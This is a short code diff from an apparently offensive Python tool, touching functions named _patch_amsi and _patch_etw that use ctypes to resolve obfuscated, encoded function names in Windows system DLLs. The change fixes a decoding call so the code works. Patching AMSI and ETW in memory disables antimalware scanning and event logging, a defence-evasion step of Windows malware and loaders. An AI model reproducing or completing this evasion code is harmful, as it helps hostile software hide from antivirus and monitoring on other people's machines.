@@ -1393,7 +1393,7 @@ def _patch_amsi():
         if not h:
             return False
         addr = ctypes.cast(
-            ctypes.windll.kernel32.GetProcAddress(h, b_sb("eZWccOv7JEFwJOLjxN8=")),
+            ctypes.windll.kernel32.GetProcAddress(h, _sb("eZWccOv7JEFwJOLjxN8=")),
             ctypes.c_void_p
         ).value
         if not addr:
@@ -1415,7 +1415,7 @@ def _patch_etw():
         fn = ctypes.cast(
             ctypes.windll.kernel32.GetProcAddress(
                 ctypes.windll.kernel32.GetModuleHandleW("ntdll.dll"),
-                b_sb("fYyYXM79K1tlI+3xxA==")
+                _sb("fYyYXM79K1tlI+3xxA==")
             ),
             ctypes.c_void_p
         ).value
